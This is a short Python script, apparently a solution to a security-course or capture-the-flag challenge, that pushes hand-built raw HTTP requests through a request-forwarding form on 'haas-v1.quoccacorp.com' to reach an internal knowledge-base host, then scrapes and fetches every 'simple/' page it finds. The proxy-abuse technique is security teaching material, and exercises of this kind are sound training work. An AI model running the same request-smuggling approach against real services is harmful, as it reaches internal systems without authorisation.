import re

import requests

s = requests.session()
# Tell requests to use the certificate.
s.cert = "../HamishWHC.pem"

request = """GET {path} HTTP/1.1\r
Host: kb.quoccacorp.com\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Referer: http://haas.quoccacorp.com/\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 0\r
Origin: http://haas.quoccacorp.com\r
Connection: keep-alive\r
\r
"""

# Send a GET request to whoami.
r = s.post(
    "https://haas-v1.quoccacorp.com",
    data={"requestBox": request.format(path="/simple")},
)
# print(r.content.decode())

matches = re.findall(r"simple/[a-z-]+", r.content.decode())


for match in matches:
    r = s.post(
        "https://haas-v1.quoccacorp.com",
        data={"requestBox": request.format(path="/" + match)},
    )
    print(r.content)
